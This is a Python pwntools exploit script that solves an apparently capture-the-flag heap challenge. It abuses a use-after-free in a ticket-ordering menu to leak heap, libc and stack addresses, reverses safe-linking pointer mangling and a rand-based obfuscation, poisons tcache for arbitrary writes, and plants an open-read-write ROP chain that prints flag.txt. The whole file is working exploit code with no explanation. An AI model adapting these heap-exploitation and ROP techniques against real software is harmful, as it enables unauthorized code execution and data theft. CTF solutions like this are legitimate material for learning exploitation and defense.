from pwn import *
from libnum import s2n, n2s
from ctypes import CDLL

elf = context.binary = ELF('../dist/main', checksec=False)
libc = ELF('../dist/libc.so.6', checksec=False)
cdll = CDLL('../dist/libc.so.6')
context.update(
    log_level='debug'
)

def order(idx:int, msg: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Seat Number : ', f'{idx}'.encode())
    p.sendafter(b'Name : ', msg)
    sleep(0.1)

def verify(idx:int, msg:bytes, payload:bytes=b'', leaked:bool=False):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Seat Number : ', f'{idx}'.encode())
    p.sendafter(b'please say your name for confirmation : ', msg)
    sleep(0.1)

    if leaked:
        p.sendafter(b'New name : ', payload)
        sleep(0.1)
    
def refund(idx:int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Seat Number : ', f'{idx}'.encode())

def demangle(addr:int) -> int:
    mid = addr >> 12 ^ addr
    ril = mid >> 24 ^ mid
    return ril

def mangle(leak:int, target:int) -> int:
    return leak >> 12 ^ target

def rev_gray_code(g: int) -> int:
    n = 0
    while g:
        n ^= g
        g >>= 1
    return n

def decrypt(target:int):
    random = [cdll.rand() & 0xFF for _ in range(len(n2s(target)))]
    print(random)

    iter = cdll.rand() % len(n2s(target))
    for _ in range(iter):
        target = rev_gray_code(target)

    target = list(n2s(target))
    for i, j in enumerate(random):
        target[i] ^= j

    return s2n(b''.join(map(n2s,reversed(target))))


p = remote("ctf.tcp1p.com", 49999)
# p = remote('localhost', 49999)
# p = elf.process()

# p = gdb.debug(['./spirit-away'], c)

# HEAP LEAK

order(0, b'A'*8)
order(1, b'B'*8)
refund(1)
refund(0)
verify(0, b'A', leaked=False)
p.recvuntil(b'Sorry sir this ticket belongs to ')
HEAP_ASLR = demangle(u64((p.recvuntil(b'1', drop=True)).ljust(8, b'\x00')))
HEAP_BASE = HEAP_ASLR - 0x1e60
log.info(f'{HEAP_BASE:x}')

for i in range(len(b'A')+1):
    print(hex(cdll.rand()))

# LIBC LEAK (unsorted bin)

order(0, b'A'*8)
order(1, b'B'*8)
order(2, b'C'*8)

for i in range(25):
    order(15, b'AAAA DUMMY AAAA')

refund(1)
refund(0)
verify(0, p64(decrypt(mangle(HEAP_BASE + 0x1e30, HEAP_BASE + 0x1e60))), p64(mangle(HEAP_BASE + 0x1e30, HEAP_BASE + 0x1e70)), leaked=True)

order(0, b'A'*8)
order(1, b'B'*0x10 + b'\x00'*8 + p64(0x451))
refund(2)
verify(2, b'A', leaked=False)
for i in range(len(b'A')+1):
    print(hex(cdll.rand()))
p.recvuntil(b'Sorry sir this ticket belongs to ')
libc.address = u64(p.recvuntil(b'1', drop=True).ljust(8, b'\x00'))  -  0x1f6ce0 # libc.sym.main_arena - 96 
log.info(f'{libc.address:x}')

# STACK LEAK (environ-0x10) 

order(0, b'A'*8)
order(1, b'B'*8)
refund(1)
refund(0)
verify(0, p64(decrypt(mangle(HEAP_BASE + 0x1e90, HEAP_BASE + 0x1ec0))), p64(mangle(HEAP_BASE + 0x1e90, libc.sym.environ - 0x10)), leaked=True)

order(0, b'A'*8)
order(1, b'B'*0x10)

verify(1, b'A', leaked=False)
for i in range(len(b'A')+1):
    print(hex(cdll.rand()))
p.recvuntil(b'Sorry sir this ticket belongs to ')
p.recvuntil(b'B'*0x10)
STACK = u64(p.recvuntil(b'1. ', drop=True).ljust(8, b'\x00'))
log.info(f'{STACK:x}')

# ROP ORW

order(0, b'./flag.txt\x00')

# 2.37
rax = libc.address + 0x00000000000400f3
rdi = libc.address + 0x00000000000240e5
rsi = libc.address + 0x000000000002573e
rdx = libc.address + 0x0000000000026302
syscall = libc.address + 0x000000000008bee6
flag = HEAP_BASE + 0x1ef0
rip = libc.address + 0x1f7ec0
rsp = libc.address + 0x000000000002f081

rop_part1 = flat(
    rdi+1,
    rax,
    0x2,
    rsi,
)
rop_part2 = flat(
    0x0,
    rdi,
    flag,
    syscall,
)
rop_part3 = flat(
    rax,
    0x0,
    rdi,
    0x5, # remote
    # 0x3, # local
)
rop_part4 = flat(
    rsi,
    flag + 0x30,
    rdx,
    0x100,
)
rop_part5 = flat(
    syscall,
    rdi,
    flag + 0x30,
    libc.sym.puts
)

order(0, b'A')
order(1, b'B')
refund(1)
refund(0)
verify(0, p64(decrypt(mangle(HEAP_BASE + 0x1f20, HEAP_BASE + 0x1f50))), p64(mangle(HEAP_BASE + 0x1f20, rip)), leaked=True)
order(0, b'DUMMY')
order(1, rop_part1)
log.info(f'PART 1')

order(0, b'A')
order(1, b'B')
refund(1)
refund(0)
verify(0, p64(decrypt(mangle(HEAP_BASE + 0x1f80, HEAP_BASE + 0x1fb0))), p64(mangle(HEAP_BASE + 0x1f80, rip + 0x20*(2-1))), leaked=True)
order(0, b'DUMMY')
order(1, rop_part2)
log.info(f'PART 2')

order(0, b'A')
order(1, b'B')
refund(1)
refund(0)
verify(0, p64(decrypt(mangle(HEAP_BASE + 0x1fe0, HEAP_BASE + 0x2010))), p64(mangle(HEAP_BASE + 0x1fe0, rip + 0x20*(3-1))), leaked=True)
order(0, b'DUMMY')
order(1, rop_part3)
log.info(f'PART 3')

order(0, b'A')
order(1, b'B')
refund(1)
refund(0)
verify(0, p64(decrypt(mangle(HEAP_BASE + 0x2040, HEAP_BASE + 0x2070))), p64(mangle(HEAP_BASE + 0x2040, rip + 0x20*(4-1))), leaked=True)
order(0, b'DUMMY')
order(1, rop_part4)
log.info(f'PART 4')

order(0, b'A')
order(1, b'B')
refund(1)
refund(0)
verify(0, p64(decrypt(mangle(HEAP_BASE + 0x20a0, HEAP_BASE + 0x20d0))), p64(mangle(HEAP_BASE + 0x20a0, rip + 0x20*(5-1))), leaked=True)
order(0, b'DUMMY')
order(1, rop_part5)
log.info(f'PART 5')

c = f'''
b* order
c
'''

# rsp magic

magic = flat(
    rdi+1,
    rsp,
    rip,
)

order(0, b'A')
order(1, b'B')
refund(1)
refund(0)
verify(0, p64(decrypt(mangle(HEAP_BASE + 0x2100, HEAP_BASE + 0x2130))), p64(mangle(HEAP_BASE + 0x2100, STACK - 0x168)), leaked=True)
order(0, b'DUMMY')
log.info(f'LIBC BASE 0x{libc.address:x}')
log.info(f'RIP       0x{rip:x}')
# gdb.attach(p,c)
order(1, magic)
log.info(f'MAGIC')

p.interactive()